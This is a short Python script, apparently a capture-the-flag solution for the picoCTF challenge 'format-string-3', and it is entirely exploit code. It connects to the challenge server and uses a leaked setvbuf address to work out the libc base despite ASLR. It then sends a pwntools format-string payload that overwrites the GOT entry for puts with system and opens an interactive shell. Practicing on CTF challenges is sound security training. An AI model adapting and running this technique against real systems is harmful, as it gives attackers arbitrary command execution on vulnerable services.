from pwn import *

context(arch="amd64", os="linux")
elf = ELF("format-string-3") # Context from local binary, so pwntools knows all offsets
libc = elf.libc


# r = gdb.debug("./format-string-3", gdbscript='continue')
# r = process("./format-string-3")
r = remote("rhea.picoctf.net", 54641)

r.recvline() # Skip howdy gamers
r.recvuntil("x") # Skip output until pointer after 0x

static_setvbuf = libc.sym.setvbuf # Get setvbuf from lib.so.6 ELF
aslred_setvbuf = r.recv(12) # Get aslred setvbuf from ELF output
aslred_setvbuf = int(aslred_setvbuf, 16) # Convert it to integer
libc.address = aslred_setvbuf - static_setvbuf # Set libc offset

r.sendline(fmtstr_payload(38, {elf.got['puts']: libc.sym['system']})) # Send the payload
r.interactive()
